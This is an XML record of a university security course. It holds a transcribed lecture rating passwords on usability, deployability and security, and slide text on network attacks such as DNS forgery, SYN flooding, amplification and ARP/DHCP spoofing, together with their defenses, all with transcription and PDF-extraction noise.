            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>that they go to.</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>This is one reason actually why
people reuse their passwords</text_slice>
            </slice>
            <slice>
              <time_slice>39:21</time_slice>
              <text_slice>often.</text_slice>
            </slice>
            <slice>
              <time_slice>39:23</time_slice>
              <text_slice>So another usability
property is easy recovery.</text_slice>
            </slice>
            <slice>
              <time_slice>39:30</time_slice>
              <text_slice>So what happens if you
lose your authentication</text_slice>
            </slice>
            <slice>
              <time_slice>39:34</time_slice>
              <text_slice>token-- in this case, your
password-- is it easy to reset?</text_slice>
            </slice>
            <slice>
              <time_slice>39:37</time_slice>
              <text_slice>And in this case, the
answer for passwords is yes.</text_slice>
            </slice>
            <slice>
              <time_slice>39:42</time_slice>
              <text_slice>In fact, they are probably
too easy to reset,</text_slice>
            </slice>
            <slice>
              <time_slice>39:44</time_slice>
              <text_slice>as we just discussed
a couple minutes ago.</text_slice>
            </slice>
            <slice>
              <time_slice>39:46</time_slice>
              <text_slice>So that's a yes.</text_slice>
            </slice>
            <slice>
              <time_slice>39:49</time_slice>
              <text_slice>And so another existing
one is nothing to carry.</text_slice>
            </slice>
            <slice>
              <time_slice>39:54</time_slice>
              <text_slice>So a lot of the more Barouque
authentication protocols</text_slice>
            </slice>
            <slice>
              <time_slice>39:58</time_slice>
              <text_slice>require you run
some smartphone app,</text_slice>
            </slice>
            <slice>
              <time_slice>40:01</time_slice>
              <text_slice>or you have some security
token or smart card or things</text_slice>
            </slice>
            <slice>
              <time_slice>40:03</time_slice>
              <text_slice>like that.</text_slice>
            </slice>
            <slice>
              <time_slice>40:04</time_slice>
              <text_slice>So that's a burden.</text_slice>
            </slice>
            <slice>
              <time_slice>40:07</time_slice>
              <text_slice>Maybe not with a
smartphone so much,</text_slice>
            </slice>
            <slice>
              <time_slice>40:08</time_slice>
              <text_slice>but having to carry around
one of these other gadgets is</text_slice>
            </slice>
            <slice>
              <time_slice>40:11</time_slice>
              <text_slice>probably a pain.</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>And so this is actually one
nice feature of passwords,</text_slice>
            </slice>
            <slice>
              <time_slice>40:17</time_slice>
              <text_slice>you basically only have to
carry around in your brain,</text_slice>
            </slice>
            <slice>
              <time_slice>40:20</time_slice>
              <text_slice>which is one that you
should have at all moments.</text_slice>
            </slice>
            <slice>
              <time_slice>40:22</time_slice>
              <text_slice>So that's basically what
usability looks like.</text_slice>
            </slice>
            <slice>
              <time_slice>40:25</time_slice>
              <text_slice>It is very interesting
in a high level</text_slice>
            </slice>
            <slice>
              <time_slice>40:27</time_slice>
              <text_slice>that a lot of times
these sort of factors</text_slice>
            </slice>
            <slice>
              <time_slice>40:30</time_slice>
              <text_slice>are given a little bit of a
short shrift in the community.</text_slice>
            </slice>
            <slice>
              <time_slice>40:33</time_slice>
              <text_slice>Security can be when people
are evaluating these schemes.</text_slice>
            </slice>
            <slice>
              <time_slice>40:36</time_slice>
              <text_slice>They say, oh, this thing uses
like a million bits of entropy,</text_slice>
            </slice>
            <slice>
              <time_slice>40:38</time_slice>
              <text_slice>and can only be broken by
the Death Star or whatever.</text_slice>
            </slice>
            <slice>
              <time_slice>40:41</time_slice>
              <text_slice>But then people
don't necessarily</text_slice>
            </slice>
            <slice>
              <time_slice>40:42</time_slice>
              <text_slice>remember these are actually
very important factors too.</text_slice>
            </slice>
            <slice>
              <time_slice>40:46</time_slice>
              <text_slice>OK so the next
high level category</text_slice>
            </slice>
            <slice>
              <time_slice>40:52</time_slice>
              <text_slice>that the authors use to
evaluate authentication scheme</text_slice>
            </slice>
            <slice>
              <time_slice>40:56</time_slice>
              <text_slice>is deployability.</text_slice>
            </slice>
            <slice>
              <time_slice>40:58</time_slice>
              <text_slice>So the base idea
here is how easy</text_slice>
            </slice>
            <slice>
              <time_slice>41:00</time_slice>
              <text_slice>is it to incorporate this system
in to current web services.</text_slice>
            </slice>
            <slice>
              <time_slice>41:05</time_slice>
              <text_slice>So one thing they
look at, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>41:07</time_slice>
              <text_slice>is is it server compatible?</text_slice>
            </slice>
            <slice>
              <time_slice>41:16</time_slice>
              <text_slice>And this basically means
can I easily integrate</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>this scheme with today's
servers, which are based</text_slice>
            </slice>
            <slice>
              <time_slice>41:22</time_slice>
              <text_slice>around text based passwords?</text_slice>
            </slice>
            <slice>
              <time_slice>41:24</time_slice>
              <text_slice>And so since success here
is defined with respect</text_slice>
            </slice>
            <slice>
              <time_slice>41:27</time_slice>
              <text_slice>to passwords, passwords succeed.</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>So another metric is
browser compatibility.</text_slice>
            </slice>
            <slice>
              <time_slice>41:35</time_slice>
              <text_slice>Similar type of thing.</text_slice>
            </slice>
            <slice>
              <time_slice>41:37</time_slice>
              <text_slice>Can I use this scheme with
current off-the-shelf browsers</text_slice>
            </slice>
            <slice>
              <time_slice>41:41</time_slice>
              <text_slice>without having to install
plug-in, something like that?</text_slice>
            </slice>
            <slice>
              <time_slice>41:44</time_slice>
              <text_slice>Once again, passwords
win by default.</text_slice>
            </slice>
            <slice>
              <time_slice>41:48</time_slice>
              <text_slice>And another interesting
one is excessibility.</text_slice>
            </slice>
            <slice>
              <time_slice>41:54</time_slice>
              <text_slice>So can people who can use
passwords now, but maybe</text_slice>
            </slice>
            <slice>
              <time_slice>41:58</time_slice>
              <text_slice>have some type of physical
disability-- maybe they're</text_slice>
            </slice>
            <slice>
              <time_slice>42:01</time_slice>
              <text_slice>blind, or they can't hear well,
or they can't gesture well,</text_slice>
            </slice>
            <slice>
              <time_slice>42:03</time_slice>
              <text_slice>or things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>42:04</time_slice>
              <text_slice>Can they actually
use this scheme?</text_slice>
            </slice>
            <slice>
              <time_slice>42:07</time_slice>
              <text_slice>This is actually
pretty important.</text_slice>
            </slice>
            <slice>
              <time_slice>42:08</time_slice>
              <text_slice>So once again, the
authors' saying yes.</text_slice>
            </slice>
            <slice>
              <time_slice>42:12</time_slice>
              <text_slice>It's a little bit weird,
because it's not clear</text_slice>
            </slice>
            <slice>
              <time_slice>42:14</time_slice>
              <text_slice>that all people with all
disabilities can use passwords,</text_slice>
            </slice>
            <slice>
              <time_slice>42:16</time_slice>
              <text_slice>but they say yes here.</text_slice>
            </slice>
            <slice>
              <time_slice>42:20</time_slice>
              <text_slice>So yes, so these are
three interesting things</text_slice>
            </slice>
            <slice>
              <time_slice>42:22</time_slice>
              <text_slice>to think about with
respect to deployability.</text_slice>
            </slice>
            <slice>
              <time_slice>42:24</time_slice>
              <text_slice>And the reason why this
deployability category</text_slice>
            </slice>
            <slice>
              <time_slice>42:26</time_slice>
              <text_slice>is so important is because it's
very difficult to get anyone</text_slice>
            </slice>
            <slice>
              <time_slice>42:29</time_slice>
              <text_slice>to upgrade anything ever.</text_slice>
            </slice>
            <slice>
              <time_slice>42:33</time_slice>
              <text_slice>I mean people don't even
want to reboot their machines</text_slice>
            </slice>
            <slice>
              <time_slice>42:35</time_slice>
              <text_slice>and get a new OS
update installed.</text_slice>
            </slice>
            <slice>
              <time_slice>42:38</time_slice>
              <text_slice>So it's very difficult that this
scheme requires usable changes</text_slice>
            </slice>
            <slice>
              <time_slice>42:40</time_slice>
              <text_slice>on the server to get
people on the server</text_slice>
            </slice>
            <slice>
              <time_slice>42:42</time_slice>
              <text_slice>to actually do different stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>42:44</time_slice>
              <text_slice>This goes back to your
question, why don't we</text_slice>
            </slice>
            <slice>
              <time_slice>42:45</time_slice>
              <text_slice>use these better things?</text_slice>
            </slice>
            <slice>
              <time_slice>42:46</time_slice>
              <text_slice>Cause deployability
in many cases</text_slice>
            </slice>
            <slice>
              <time_slice>42:47</time_slice>
              <text_slice>is super, super
important to people.</text_slice>
            </slice>
            <slice>
              <time_slice>42:51</time_slice>
              <text_slice>All right, so then the final
category that we will look at</text_slice>
            </slice>
            <slice>
              <time_slice>42:56</time_slice>
              <text_slice>is security.</text_slice>
            </slice>
            <slice>
              <time_slice>43:00</time_slice>
              <text_slice>Right, so what kinds of attacks
can this scheme prevent?</text_slice>
            </slice>
            <slice>
              <time_slice>43:04</time_slice>
              <text_slice>So a lot of these
security properties</text_slice>
            </slice>
            <slice>
              <time_slice>43:09</time_slice>
              <text_slice>are resilient to foo.</text_slice>
            </slice>
            <slice>
              <time_slice>43:12</time_slice>
              <text_slice>I'll just shorten
that one of reds.</text_slice>
            </slice>
            <slice>
              <time_slice>43:15</time_slice>
              <text_slice>So is the scheme resilient
to physical observations?</text_slice>
            </slice>
            <slice>
              <time_slice>43:25</time_slice>
              <text_slice>So the idea here is
that an attacker can not</text_slice>
            </slice>
            <slice>
              <time_slice>43:27</time_slice>
              <text_slice>impersonate the
user after observing</text_slice>
            </slice>
            <slice>
              <time_slice>43:30</time_slice>
              <text_slice>them authenticate a few times.</text_slice>
            </slice>
            <slice>
              <time_slice>43:33</time_slice>
              <text_slice>So imagine that you
had a shoulder surfer.</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>So you're somewhere
in a computer lab,</text_slice>
            </slice>
            <slice>
              <time_slice>43:37</time_slice>
              <text_slice>someone's looking
over your shoulder,</text_slice>
            </slice>
            <slice>
              <time_slice>43:38</time_slice>
              <text_slice>seeing what you type in.</text_slice>
            </slice>
            <slice>
              <time_slice>43:39</time_slice>
              <text_slice>Someone's videotaping
you, maybe someone's</text_slice>
            </slice>
            <slice>
              <time_slice>43:42</time_slice>
              <text_slice>got a microphone listening
to the acoustic signature</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>of your keyboard and
trying to extract things</text_slice>
            </slice>
            <slice>
              <time_slice>43:46</time_slice>
              <text_slice>from that, so on and so forth.</text_slice>
            </slice>
            <slice>
              <time_slice>43:49</time_slice>
              <text_slice>So the authors say
that passwords actually</text_slice>
            </slice>
            <slice>
              <time_slice>43:53</time_slice>
              <text_slice>failed this test.</text_slice>
            </slice>
            <slice>
              <time_slice>43:55</time_slice>
              <text_slice>And that's because someone can
videotape typing in things,</text_slice>
            </slice>
            <slice>
              <time_slice>44:00</time_slice>
              <text_slice>they can pretty easily figure
out what letters you typed.</text_slice>
            </slice>
            <slice>
              <time_slice>44:02</time_slice>
              <text_slice>Or there's actually these
attacks where you can actually</text_slice>
            </slice>
            <slice>
              <time_slice>44:04</time_slice>
              <text_slice>listen to the acoustic
fingerprint of the keyboard,</text_slice>
            </slice>
            <slice>
              <time_slice>44:07</time_slice>
              <text_slice>and detect what was typed based
on what sounds that you hear.</text_slice>
            </slice>
            <slice>
              <time_slice>44:11</time_slice>
              <text_slice>So passwords are not resistant
to physical observation.</text_slice>
            </slice>
            <slice>
              <time_slice>44:15</time_slice>
              <text_slice>So another property is resistant
to targeted impersonation.</text_slice>
            </slice>
            <slice>
              <time_slice>44:28</time_slice>
              <text_slice>And so the base
idea here that, is</text_slice>
            </slice>
            <slice>
              <time_slice>44:30</time_slice>
              <text_slice>that is it possible for someone
who knows you-- a friend,</text_slice>
            </slice>
            <slice>
              <time_slice>44:33</time_slice>
              <text_slice>an acquaintance, a
spouse, a loved one,</text_slice>
            </slice>
            <slice>
              <time_slice>44:35</time_slice>
              <text_slice>a family member,
whatever-- to impersonate</text_slice>
            </slice>
            <slice>
              <time_slice>44:38</time_slice>
              <text_slice>you using their knowledge of
who you are and what you do.</text_slice>
            </slice>
            <slice>
              <time_slice>44:44</time_slice>
              <text_slice>So could your friend try
to pretend to be you easily</text_slice>
            </slice>
            <slice>
              <time_slice>44:46</time_slice>
              <text_slice>in this particular scheme?</text_slice>
            </slice>
            <slice>
              <time_slice>44:47</time_slice>
              <text_slice>So here the authors
basically have another one</text_slice>
            </slice>
            <slice>
              <time_slice>44:53</time_slice>
              <text_slice>of these quasi-yeses.</text_slice>
            </slice>
            <slice>
              <time_slice>44:56</time_slice>
              <text_slice>And they say quasi-yes
because they're not</text_slice>
            </slice>
            <slice>
              <time_slice>44:59</time_slice>
              <text_slice>aware of any studies which
show that if you know a person,</text_slice>
            </slice>
            <slice>
              <time_slice>45:03</time_slice>
              <text_slice>you're more likely to
guess their password.</text_slice>
            </slice>
            <slice>
              <time_slice>45:05</time_slice>
              <text_slice>So they say quasi-yes for that.</text_slice>
            </slice>
            <slice>
              <time_slice>45:07</time_slice>
              <text_slice>And so, note that resistance
is targeted impersonation.</text_slice>
            </slice>
            <slice>
              <time_slice>45:10</time_slice>
              <text_slice>This is where most
security backup</text_slice>
            </slice>
            <slice>
              <time_slice>45:12</time_slice>
              <text_slice>questions fail miserably.</text_slice>
            </slice>
            <slice>
              <time_slice>45:14</time_slice>
              <text_slice>Because if someone knows
something about you,</text_slice>
            </slice>
            <slice>
              <time_slice>45:16</time_slice>
              <text_slice>quite easily they can guess
your security questions</text_slice>
            </slice>
            <slice>
              <time_slice>45:19</time_slice>
              <text_slice>in many cases.</text_slice>
            </slice>
            <slice>
              <time_slice>45:22</time_slice>
              <text_slice>So then we have two categories
that involve guessing.</text_slice>
            </slice>
            <slice>
              <time_slice>45:27</time_slice>
              <text_slice>So the first one is resilient
to throttle guessing.</text_slice>
            </slice>
            <slice>
              <time_slice>45:34</time_slice>
              <text_slice>And so what this means is
if the attacker can not</text_slice>
            </slice>
            <slice>
              <time_slice>45:42</time_slice>
              <text_slice>issue guesses at line
rate, because for, example,</text_slice>
            </slice>
            <slice>
              <time_slice>45:47</time_slice>
              <text_slice>the server uses
anti-hammering mechanisms.</text_slice>
            </slice>
            <slice>
              <time_slice>45:51</time_slice>
              <text_slice>Is the scheme safe
against the attacker?</text_slice>
            </slice>
            <slice>
              <time_slice>45:56</time_slice>
              <text_slice>And so here, they say no.</text_slice>
            </slice>
            <slice>
              <time_slice>46:01</time_slice>
              <text_slice>And so the reason
why they say no,</text_slice>
            </slice>
            <slice>
              <time_slice>46:02</time_slice>
              <text_slice>is because in practice
passwords not only</text_slice>
            </slice>
            <slice>
              <time_slice>46:05</time_slice>
              <text_slice>have sort of low inherit entropy
because they're not that long,</text_slice>
            </slice>
            <slice>
              <time_slice>46:09</time_slice>
              <text_slice>but also they have that
skewed distribution.</text_slice>
            </slice>
            <slice>
              <time_slice>46:12</time_slice>
              <text_slice>And so what that means is
that even if the attacker is</text_slice>
            </slice>
            <slice>
              <time_slice>46:15</time_slice>
              <text_slice>throttled in some way,
typically the attacker can still</text_slice>
            </slice>
            <slice>
              <time_slice>46:18</time_slice>
              <text_slice>make good forward
progress and crack</text_slice>
            </slice>
            <slice>
              <time_slice>46:20</time_slice>
              <text_slice>a lot of people's passwords.</text_slice>
            </slice>
            <slice>
              <time_slice>46:22</time_slice>
              <text_slice>So they define another
guessing property</text_slice>
            </slice>
            <slice>
              <time_slice>46:26</time_slice>
              <text_slice>which is resistant to
unthrottled guessing.</text_slice>
            </slice>
            <slice>
              <time_slice>46:34</time_slice>
              <text_slice>And so this is basically
saying, suppose</text_slice>
            </slice>
            <slice>
              <time_slice>46:38</time_slice>
              <text_slice>that the attacker can issue
these authentication forgery</text_slice>
            </slice>
            <slice>
              <time_slice>46:44</time_slice>
              <text_slice>request as quickly
as he or she wants.</text_slice>
            </slice>
            <slice>
              <time_slice>46:47</time_slice>
              <text_slice>So in other words,
the attacker is only</text_slice>
            </slice>
            <slice>
              <time_slice>46:49</time_slice>
              <text_slice>limited by the speed
of their hardware.</text_slice>
            </slice>
            <slice>
              <time_slice>46:51</time_slice>
              <text_slice>So is the authentication
scheme resilient to that type</text_slice>
            </slice>
            <slice>
              <time_slice>46:54</time_slice>
              <text_slice>of attack?</text_slice>
            </slice>
            <slice>
              <time_slice>46:55</time_slice>
              <text_slice>And here maybe this answer's
also no, for the same reason</text_slice>
            </slice>
            <slice>
              <time_slice>46:59</time_slice>
              <text_slice>that the answer was no up here.</text_slice>
            </slice>
            <slice>
              <time_slice>47:01</time_slice>
              <text_slice>So basically passwords have
a very small entropy space</text_slice>
            </slice>
            <slice>
              <time_slice>47:04</time_slice>
              <text_slice>and they come
skewed distribution.</text_slice>
            </slice>
            <slice>
              <time_slice>47:07</time_slice>
              <text_slice>So that's all pretty
straightforward.</text_slice>
            </slice>
            <slice>
              <time_slice>47:10</time_slice>
              <text_slice>One interesting
one is resiliency</text_slice>
            </slice>
            <slice>
              <time_slice>47:13</time_slice>
              <text_slice>to internal observation.</text_slice>
            </slice>
            <slice>
              <time_slice>47:21</time_slice>
              <text_slice>So this means that
the attacker can not</text_slice>
            </slice>
            <slice>
              <time_slice>47:23</time_slice>
              <text_slice>impersonate a user like
intercepting that users input.</text_slice>
            </slice>
            <slice>
              <time_slice>47:27</time_slice>
              <text_slice>For example, by installing
a keystroke logger</text_slice>
            </slice>
            <slice>
              <time_slice>47:31</time_slice>
              <text_slice>on the keyboard that
the user's using,</text_slice>
            </slice>
            <slice>
              <time_slice>47:34</time_slice>
              <text_slice>and using that logger
to steal keypresses.</text_slice>
            </slice>
            <slice>
              <time_slice>47:37</time_slice>
              <text_slice>This also means, for
example, that there's</text_slice>
            </slice>
            <slice>
              <time_slice>47:39</time_slice>
              <text_slice>no way for network
attacker who's</text_slice>
            </slice>
            <slice>
              <time_slice>47:41</time_slice>
              <text_slice>observing the things that the
client sending over the wire</text_slice>
            </slice>
            <slice>
              <time_slice>47:44</time_slice>
              <text_slice>to use that knowledge
of the network traffic</text_slice>
            </slice>
            <slice>
              <time_slice>47:48</time_slice>
              <text_slice>to later impersonate the user.</text_slice>
            </slice>
            <slice>
              <time_slice>47:50</time_slice>
              <text_slice>And so here they say password
do not have this scheme.</text_slice>
            </slice>
            <slice>
              <time_slice>47:56</time_slice>
              <text_slice>And they essentially say
it's because passwords</text_slice>
            </slice>
            <slice>
              <time_slice>47:59</time_slice>
              <text_slice>are static tokens.</text_slice>
            </slice>
            <slice>
              <time_slice>48:02</time_slice>
              <text_slice>They don't change.</text_slice>
            </slice>
            <slice>
              <time_slice>48:03</time_slice>
              <text_slice>And typically static tokens
are vulnerable to replay.</text_slice>
            </slice>
            <slice>
              <time_slice>48:06</time_slice>
              <text_slice>So if somehow, for
example, an attacker</text_slice>
            </slice>
            <slice>
              <time_slice>48:08</time_slice>
              <text_slice>installs a keystroke logger
and gets your password,</text_slice>
            </slice>
            <slice>
              <time_slice>48:11</time_slice>
              <text_slice>then basically the attacker
can use that password</text_slice>
            </slice>
            <slice>
              <time_slice>48:14</time_slice>
              <text_slice>until it's either expired or
revoked or something that.</text_slice>
            </slice>
            <slice>
              <time_slice>48:17</time_slice>
              <text_slice>It you just replay
it again it'll</text_slice>
            </slice>
            <slice>
              <time_slice>48:18</time_slice>
              <text_slice>go into that authenticating
server on the other side.</text_slice>
            </slice>
            <slice>
              <time_slice>48:20</time_slice>
              <text_slice>So here, passwords
actually fail that test.</text_slice>
            </slice>
            <slice>
              <time_slice>48:25</time_slice>
              <text_slice>Another thing that we
talked about a little bit</text_slice>
            </slice>
            <slice>
              <time_slice>48:27</time_slice>
              <text_slice>in this class phishing.</text_slice>
            </slice>
            <slice>
              <time_slice>48:29</time_slice>
              <text_slice>So resilience to phishing
is another security metric.</text_slice>
            </slice>
            <slice>
              <time_slice>48:36</time_slice>
              <text_slice>And the base idea here is that,
if the attacker can simulate</text_slice>
            </slice>
            <slice>
              <time_slice>48:40</time_slice>
              <text_slice>a valid service-- for
example, by attacking the DNS</text_slice>
            </slice>
            <slice>
              <time_slice>48:43</time_slice>
              <text_slice>infrastructure or
something like that--</text_slice>
            </slice>
            <slice>
              <time_slice>48:45</time_slice>
              <text_slice>then the attacker cannot collect
credentials from the user,</text_slice>
            </slice>
            <slice>
              <time_slice>48:49</time_slice>
              <text_slice>then the attacker can then use
to pretend to be the user later</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>on.</text_slice>
            </slice>
            <slice>
              <time_slice>48:53</time_slice>
              <text_slice>And so this basically
supposed penalized sites that</text_slice>
            </slice>
            <slice>
              <time_slice>48:58</time_slice>
              <text_slice>do not strongly tell
the user, hey, I'm</text_slice>
            </slice>
            <slice>
              <time_slice>49:03</time_slice>
              <text_slice>this particular service, so you
can feel confident to give me</text_slice>
            </slice>
            <slice>
              <time_slice>49:06</time_slice>
              <text_slice>your credentials.</text_slice>
            </slice>
            <slice>
              <time_slice>49:07</time_slice>
              <text_slice>And so if here passwords fail
just because phishing sites</text_slice>
            </slice>
            <slice>
              <time_slice>49:11</time_slice>
              <text_slice>are very, very popular.</text_slice>
            </slice>
            <slice>
              <time_slice>49:13</time_slice>
              <text_slice>So passwords don't really
intrinsically provide</text_slice>
            </slice>
            <slice>
              <time_slice>49:15</time_slice>
              <text_slice>any protection against that.</text_slice>
            </slice>
            <slice>
              <time_slice>49:20</time_slice>
              <text_slice>Now the next two
are particularly</text_slice>
            </slice>
            <slice>
              <time_slice>49:23</time_slice>
              <text_slice>interesting in the context of a
large scale distributed system.</text_slice>
            </slice>
            <slice>
              <time_slice>49:28</time_slice>
              <text_slice>So no trusted third party.</text_slice>
            </slice>
            <slice>
              <time_slice>49:33</time_slice>
              <text_slice>This essentially
means that other</text_slice>
            </slice>
            <slice>
              <time_slice>49:35</time_slice>
              <text_slice>than the client and the
server, there's no one else</text_slice>
            </slice>
            <slice>
              <time_slice>49:38</time_slice>
              <text_slice>in the system that is involved
in the authentication protocol.</text_slice>
            </slice>
            <slice>
              <time_slice>49:44</time_slice>
              <text_slice>And so, that means that
there's no third party who,</text_slice>
            </slice>
            <slice>
              <time_slice>49:47</time_slice>
              <text_slice>if that third party
were compromised,</text_slice>
            </slice>
            <slice>
              <time_slice>49:49</time_slice>
              <text_slice>the entire integrity of
the securities scheme</text_slice>
            </slice>
            <slice>
              <time_slice>49:51</time_slice>
              <text_slice>might fall apart.</text_slice>
            </slice>
            <slice>
              <time_slice>49:52</time_slice>
              <text_slice>And so, this is actually
an interesting property</text_slice>
            </slice>
            <slice>
              <time_slice>49:54</time_slice>
              <text_slice>to look at because a lot
of authentication problems</text_slice>
            </slice>
            <slice>
              <time_slice>49:56</time_slice>
              <text_slice>would go away if we could just
store all our authentication</text_slice>
            </slice>
            <slice>
              <time_slice>49:59</time_slice>
              <text_slice>information in one place.</text_slice>
            </slice>
            <slice>
              <time_slice>50:01</time_slice>
              <text_slice>We just store it in one
place, it's very simple,</text_slice>
            </slice>
            <slice>
              <time_slice>50:04</time_slice>
              <text_slice>we don't have to remember a
lot of stuff on the client,</text_slice>
            </slice>
            <slice>
              <time_slice>50:05</time_slice>
              <text_slice>we just say, whatever
service you want to use,</text_slice>
            </slice>
            <slice>
              <time_slice>50:07</time_slice>
              <text_slice>you always go to
this one third party,</text_slice>
            </slice>
            <slice>
              <time_slice>50:10</time_slice>
              <text_slice>and that third
party will always be</text_slice>
            </slice>
            <slice>
              <time_slice>50:11</time_slice>
              <text_slice>able to of authenticate
you, and then</text_slice>
            </slice>
            <slice>
              <time_slice>50:14</time_slice>
              <text_slice>allow you to go on your way.</text_slice>
            </slice>
            <slice>
              <time_slice>50:17</time_slice>
              <text_slice>Now of course third parties are
problematic with perspective</text_slice>
            </slice>
            <slice>
              <time_slice>50:20</time_slice>
              <text_slice>of robustness right
because if you</text_slice>
            </slice>
            <slice>
              <time_slice>50:22</time_slice>
              <text_slice>have one of these
global third parties</text_slice>
            </slice>
            <slice>
              <time_slice>50:24</time_slice>
              <text_slice>that everybody trusts, if that
third party gets subverted then</text_slice>
            </slice>
            <slice>
              <time_slice>50:27</time_slice>
              <text_slice>perhaps the integrity
of all the sites</text_slice>
            </slice>
            <slice>
              <time_slice>50:29</time_slice>
              <text_slice>that use that third party to
authenticate all those sites</text_slice>
            </slice>
            <slice>
              <time_slice>50:32</time_slice>
              <text_slice>are potentially in danger.</text_slice>
            </slice>
            <slice>
              <time_slice>50:35</time_slice>
              <text_slice>So they say that passwords do
not have a trusted third party</text_slice>
            </slice>
            <slice>
              <time_slice>50:39</time_slice>
              <text_slice>because each user is forced
to have a separate password</text_slice>
            </slice>
            <slice>
              <time_slice>50:43</time_slice>
              <text_slice>for each site.</text_slice>
            </slice>
            <slice>
              <time_slice>50:46</time_slice>
              <text_slice>A related property is</text_slice>
            </slice>
          </transcript>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Network Security (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec12/</lecture_pdf_url>
      <lectureno>12</lectureno>
      <slides>
        <slide>
          <slideno>3</slideno>
          <text>oRequires	&#13; no extra	&#13; state to keep track	&#13; of per-connection	&#13; ISNs.
Are sequence number attacks still relevant?
Most operating systems implement the per-connection	&#13; ISN workaround	&#13; above.
oRef: Linux	&#13; secure_tcp_sequence_n umber	&#13; in net/core/secure_seq.c
But other protocols suffer from almost identical problems -- e.g., DNS.
oDNS runs over UDP, no
seq numbers, just ports, and dst port fixed (53).
oIf adversary knows client is making a query, can fake a response.
Just need	&#13; to	&#13; guess src port,	&#13; often	&#13; predictable.
oProblem gained popularity
in 2008, though well-understood by djb
befo
re.
 Ref:  http://cr.yp.to/djbdns/forgery.html
 Ref:  http://unixwiz.net/techtips/iguide-kminsky-dns-vuln.html
oSolution: carefully	&#13; take advantage of all possible randomness!
DNS queries	&#13; contain 16 -bit	&#13; query ID, and can randomize ~16 bit
src port.
oSolution: deploy DNSSEC (signed DNS records, including
missing
records).
oOne problem: key distribution (who is allowed to sign
each domain?)
oAnother problem: name enumeration (to sign "no such name" responses).
 Partially mitigated by NSEC3: http://tools.ietf.org/html/rfc5155
oSlow adoption, not much incentive to upgrade, non-trivial	&#13; costs.
oCosts	&#13; include both performance and administrative (key/certmanagement).
SYN flooding.
Note that server must store some state when it receives a SYN packet.
oCalled	&#13; a half-open	&#13; connection:	&#13; replied	&#13; with	&#13; SYN -ACK,	&#13; waiting for the ACK.
What if it receives SYN messages from many sources?
oMany implementations
try to keep state for all	&#13; half -open	&#13; connections.
oBut eventually run out of memory, must reject connections!
Annoying problem: we don't even
know who we're keeping state for!
oAdversary could have a single
host, and generate SYNs from many src IPs.
Denial-
of-service	&#13; attack:	&#13; big	&#13; as ymmetry	&#13; between client + server resources.
oClient	&#13; spoofs a single packet (less than 1 millisecond).
oServer wastes memory until
connection times out (minutes).
Defense	&#13; for SYN	&#13; flooding:	&#13; SYN	&#13; cookies.Idea:
make the server stateless, until it receives that third packet (ACK).
Why is this tricky?
oNeed to ensure an adversary can't make up a conn from any src address.
oPreviously, this was done by storing ISNs, and expecting it in the ACK.
Use a bit
of cryptography to achieve similar goal.
Encode	&#13; server -side	&#13; state	&#13; into sequence number.
oISNs = MAC_k(src/dst	&#13; addr+port, timestamp) || timestamp
4</text>
        </slide>
        <slide>
          <slideno>4</slideno>
          <text>oTimestamp is coarse-grained (e.g., minutes).
oServer stores	&#13; secret	&#13; key k, not shared	&#13; with anyone else.
oDetailed ref: http://cr.yp.to/syncookies.html
Server computes seq as above	&#13; when	&#13; sending SYN -ACK	&#13; response.
Server can verify state is intact by verifying hash (MAC)	&#13; on ACK's	&#13; seq.
oNot quite ideal: need to think about replay attacks within timestamp.
Another problem: if third packet lost, noone retransmits.
oMaybe not	&#13; a big	&#13; de
al	&#13; in case of a DoS attack.
oOnly a problem for protocols where server
speaks first.
Another DoS attack vector: bandwidth amplification.
Send ICMP	&#13; echo request	&#13; (ping) packets to the br
oadcast	&#13; address	&#13; of a network.
oE.g., 18.26.7.255.
oUsed to	&#13; be	&#13; that  you'd get an ICMP	&#13; echo reply from  all machines  on
network.
oWhat if you fake a packet from victim's address? Victim	&#13; gets all replies.
oFind a subnet with 100 machines on a fast network: 100x amplification!
oRef: http://en.wikipedia.org/wiki/Smurf_attack
Can we	&#13; fix this?
oRouters	&#13; now block "directed	&#13; broadcast"	&#13; (packets sent to broadcast
address).
Modern-day	&#13; variant: DNS
amplification.
oDNS is also	&#13; a request -response	&#13; service.
oWith a
small query, server might send back a large
response.
oWith DNSSEC,	&#13; responses contain	&#13; lots of signatures,	&#13; so they're	&#13; even larger!
oSince DNS runs over
UDP, source address is completely unverified.
oRef:  http://blog.cloudflare.com/deep -inside- a-dns-amplification-ddos-
attack
Can we	&#13; fix the	&#13; DNS attack?
oActually quite hard! Root name servers must answer to queries from
anyone.
What	&#13; if
we had a chance to re -design	&#13; DNS from scratch?
oOne possible plan: query must be as big as response (require padding).
oGeneral technique:
force client to expend at least as much work.
TCP congestion	&#13; control.
Receiver
can ge t	&#13; the sender to speed up, by ACKing	&#13; unreceived segments. Or
send more ACKs	&#13; (e.g., send ACK	&#13; for
each byte instead of every packet).
Routing protocols:	&#13; overly -trusting	&#13; of participants.
ARP: within a single
Ethernet network.
oTo send IP packet,	&#13; need the	&#13; Ether net	&#13; MAC address of router / next hop.
oAddress Resolution Protocol (ARP): broadcast a request for
target's MAC.
oAnyone can listen to broadcast,
send a reply; no authentication.
5</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>oAdversary can impersonate router, intercept packets, even on switched
net.
oPotential solution: make the switch in charge of ARP.
Not widely deployed: would
require managing MAC/IP	&#13; addresses
carefully.
DHCP: again, within a single	&#13; Ethernet network.
oClient asks	&#13; for IP	&#13; address	&#13; by	&#13; sending a broadcast request.
oServer  responds,	&#13; no  authentication	&#13; (some  specs  exist but  not widely
used).
If you just plugged into a network, might not
know what to expect.
oLots of fields: IP address, router address, DNS server, DNS domain list, ..
oAdversary can impersonate DHCP	&#13; server to new clients on the
network.
